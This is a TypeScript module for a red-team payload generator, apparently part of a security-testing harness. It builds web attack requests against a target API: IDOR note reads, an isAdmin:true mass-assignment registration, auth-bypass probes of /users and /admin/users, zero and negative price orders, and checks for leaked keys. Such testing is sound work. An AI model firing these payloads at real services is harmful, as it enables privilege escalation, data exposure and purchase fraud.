/**
 * Red Team — Payload Generator
 *
 * Produces adversarial payloads for each vulnerability class.
 * Each generator returns an array of AttackPayload objects that the
 * attack runner will fire against the target API.
 */

export type VulnClass =
  | "IDOR"
  | "MASS_ASSIGNMENT"
  | "AUTH_BYPASS"
  | "PRICE_MANIPULATION"
  | "INFO_DISCLOSURE";

export interface AttackPayload {
  id: string;
  vulnClass: VulnClass;
  description: string;
  method: "GET" | "POST" | "PUT" | "DELETE" | "PATCH";
  path: string;
  headers?: Record<string, string>;
  body?: unknown;
  /** Credentials to attempt login with after this payload fires (used to verify privilege escalation). */
  verifyLoginAs?: { username: string; password: string };
}

// ── IDOR payloads ─────────────────────────────────────────────────────────────
export function idorPayloads(): AttackPayload[] {
  return [1, 2, 3, 4, 5].map((id) => ({
    id: `IDOR-NOTE-${id}`,
    vulnClass: "IDOR" as const,
    description: `Access note id=${id} as a different user`,
    method: "GET" as const,
    path: `/notes/${id}`,
  }));
}

// ── Mass-assignment payloads ──────────────────────────────────────────────────
export function massAssignmentPayloads(): AttackPayload[] {
  const evilUser = `evil_${Date.now()}`;
  return [
    {
      id: "MASS-ASSIGN-ADMIN-01",
      vulnClass: "MASS_ASSIGNMENT",
      description: "Register a new user with isAdmin:true via request body",
      method: "POST",
      path: "/register",
      body: { username: evilUser, password: "pwned", isAdmin: true },
      // Runner logs in as this user after registration and probes /admin/users
      verifyLoginAs: { username: evilUser, password: "pwned" },
    },
  ];
}

// ── Auth-bypass payloads ──────────────────────────────────────────────────────
export function authBypassPayloads(): AttackPayload[] {
  return [
    {
      id: "AUTH-BYPASS-USER-LIST",
      vulnClass: "AUTH_BYPASS",
      description: "Fetch /users without any token (should be 401)",
      method: "GET",
      path: "/users",
    },
    {
      id: "AUTH-BYPASS-ADMIN",
      vulnClass: "AUTH_BYPASS",
      description: "Access /admin/users with a non-admin token",
      method: "GET",
      path: "/admin/users",
    },
  ];
}

// ── Price manipulation payloads ───────────────────────────────────────────────
export function priceManipulationPayloads(): AttackPayload[] {
  return [
    {
      id: "PRICE-MANIP-ZERO",
      vulnClass: "PRICE_MANIPULATION",
      description: "Submit order with price=0",
      method: "POST",
      path: "/orders",
      body: { product: "FreeLaptop", price: 0 },
    },
    {
      id: "PRICE-MANIP-NEGATIVE",
      vulnClass: "PRICE_MANIPULATION",
      description: "Submit order with price=-999 (store credit exploit)",
      method: "POST",
      path: "/orders",
      body: { product: "NegativePriceItem", price: -999 },
    },
  ];
}

// ── Information-disclosure payloads ──────────────────────────────────────────
export function infoDisclosurePayloads(): AttackPayload[] {
  return [
    {
      id: "INFO-DISC-USER-LIST",
      vulnClass: "INFO_DISCLOSURE",
      description: "Check if /users response leaks apiKey or password fields",
      method: "GET",
      path: "/users",
    },
  ];
}

/** Returns the full combined payload suite. */
export function allPayloads(): AttackPayload[] {
  return [
    ...idorPayloads(),
    ...massAssignmentPayloads(),
    ...authBypassPayloads(),
    ...priceManipulationPayloads(),
    ...infoDisclosurePayloads(),
  ];
}
